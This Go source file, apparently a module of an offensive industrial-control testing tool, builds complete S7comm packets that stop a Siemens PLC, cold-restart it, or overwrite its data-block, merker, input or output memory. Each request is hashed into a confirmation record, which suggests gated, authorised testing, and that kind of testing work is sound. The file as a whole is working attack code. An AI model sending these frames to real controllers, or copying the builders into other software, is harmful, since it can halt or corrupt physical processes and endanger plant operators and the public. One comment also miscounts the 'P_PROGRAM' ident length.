//go:build offensive

package s7

import (
	"crypto/sha256"
	"errors"
	"fmt"

	s7wire "local/elsereno/internal/protocols/s7/wire"
	"local/elsereno/offensive/confirm"
)

// Op is the S7 mutation kind.
type Op string

// Operations supported in F5. PLC-control hot/cold/warm restart and
// stop are the "classic" Siemens mutations; WriteVar covers memory
// writes of any data-block / merker region.
//
//nolint:gosec // G101 false positive — op labels
const (
	OpWriteVar   Op = "write_var"   // S7 func 0x05
	OpPLCStop    Op = "plc_stop"    // S7 func 0x29
	OpPLCRestart Op = "plc_restart" // S7 func 0x28 (cold restart)
)

// Request is a single S7 mutation. WriteVar uses Area/DBNumber/
// Address/Data; Stop / Restart ignore them.
type Request struct {
	Op       Op
	Target   string
	PDURef   uint16
	Area     uint8 // 0x84 = DB, 0x83 = M, 0x81 = I, 0x82 = Q
	DBNumber uint16
	Address  uint32 // bit address (byte address << 3)
	Data     []byte
}

// Errors returned by Build.
var (
	ErrBadOp        = errors.New("s7-write: unknown op")
	ErrEmptyPayload = errors.New("s7-write: WriteVar requires data")
	ErrDataTooLong  = errors.New("s7-write: data > 200 bytes (1-PDU cap)")
)

// Build returns the full TPKT envelope bytes (ready to WriteTPKT).
// Returned slice is ready to ship over an established TPKT/COTP
// connection.
func Build(r Request) ([]byte, error) {
	switch r.Op {
	case OpWriteVar:
		return buildWriteVar(r)
	case OpPLCStop:
		return buildPLCStop(r.PDURef), nil
	case OpPLCRestart:
		return buildPLCRestart(r.PDURef), nil
	default:
		return nil, fmt.Errorf("%w: %q", ErrBadOp, r.Op)
	}
}

// MutationFor constructs the confirm.Mutation for r. The payload
// hash is SHA-256 over the built envelope.
func MutationFor(r Request) (confirm.Mutation, error) {
	env, err := Build(r)
	if err != nil {
		return confirm.Mutation{}, err
	}
	h := sha256.Sum256(env)
	return confirm.Mutation{
		Category:    confirm.CategoryWrite,
		Protocol:    "s7",
		Operation:   string(r.Op),
		Target:      r.Target,
		PayloadHash: h,
	}, nil
}

// --- S7 PDU constructors ---

const (
	s7Magic      byte = 0x32
	rosctrJob    byte = 0x01
	paramRead    byte = 0x04
	paramWrite   byte = 0x05
	paramPLCCtl  byte = 0x28
	paramPLCStop byte = 0x29
)

//nolint:gosec // G115 — lengths bounded by ErrDataTooLong guard above
func buildWriteVar(r Request) ([]byte, error) {
	if len(r.Data) == 0 {
		return nil, ErrEmptyPayload
	}
	if len(r.Data) > 200 {
		return nil, ErrDataTooLong
	}
	// Item (12 bytes): 0x12 + 0x0A + 0x10 + transport + length(2) +
	// DB(2) + area + address(3)
	transport := byte(0x02) // Byte / Char
	addr := r.Address
	n := uint16(len(r.Data))
	nbits := uint16(len(r.Data) * 8)
	item := []byte{
		0x12, 0x0A, 0x10,
		transport,
		byte(n >> 8), byte(n & 0xFF),
		byte(r.DBNumber >> 8), byte(r.DBNumber & 0xFF),
		r.Area,
		byte(addr >> 16), byte(addr >> 8), byte(addr & 0xFF),
	}
	// Data (4 + len): transport class (1) + len(2) + data
	dataHdr := []byte{
		0x00, // code (0 = OK for request)
		0x04, // transport: byte
		byte(nbits >> 8), byte(nbits & 0xFF),
	}
	dataSection := append([]byte{}, dataHdr...)
	dataSection = append(dataSection, r.Data...)

	// Parameter: function(1) + item-count(1) + item
	param := []byte{paramWrite, 0x01}
	param = append(param, item...)

	return wrapTPKTS7(param, dataSection, r.PDURef), nil
}

func buildPLCStop(pduRef uint16) []byte {
	// Stop PDU: function 0x29 + empty "stop" string + trailing
	// 5-byte ident "P_PROGRAM".
	param := []byte{paramPLCStop, 0x00, 0x00, 0x00, 0x00, 0x09, 'P', '_', 'P', 'R', 'O', 'G', 'R', 'A', 'M'}
	return wrapTPKTS7(param, nil, pduRef)
}

func buildPLCRestart(pduRef uint16) []byte {
	// Cold restart parameter.
	param := []byte{
		paramPLCCtl,
		0x00, 0x00, 0x00, 0x00, 0x00,
		0xFD,       // unknown
		0x00, 0x00, // param length
		0x09, // length of "P_PROGRAM"
		'P', '_', 'P', 'R', 'O', 'G', 'R', 'A', 'M',
	}
	return wrapTPKTS7(param, nil, pduRef)
}

// wrapTPKTS7 wraps param+data in an S7 Job header, then COTP DT,
// then TPKT.
//
//nolint:gosec // G115 — lengths bounded by caller (WriteVar enforces 200-byte cap; control frames are fixed)
func wrapTPKTS7(param, data []byte, pduRef uint16) []byte {
	pl := uint16(len(param))
	dl := uint16(len(data))
	// S7 header: magic | rosctr | redundancy(2) | pduRef(2) |
	// paramLen(2) | dataLen(2)  = 10 bytes.
	s7 := []byte{
		s7Magic, rosctrJob,
		0x00, 0x00,
		byte(pduRef >> 8), byte(pduRef & 0xFF),
		byte(pl >> 8), byte(pl & 0xFF),
		byte(dl >> 8), byte(dl & 0xFF),
	}
	s7 = append(s7, param...)
	s7 = append(s7, data...)
	// COTP DT: LI=02 + type=0xF0 + TPDU-nr=0x80 = 3 bytes.
	cotp := []byte{0x02, 0xF0, 0x80}
	payload := append([]byte{}, cotp...)
	payload = append(payload, s7...)
	// TPKT: 4-byte header, total length big-endian.
	total := uint16(4 + len(payload))
	hdr := []byte{0x03, 0x00, byte(total >> 8), byte(total & 0xFF)}
	return append(hdr, payload...)
}

// Keep s7wire in reach for future RefusalPayload reuse. Not used
// directly yet; import kept so go vet doesn't complain when
// Execute lands.
var _ = s7wire.COTPType
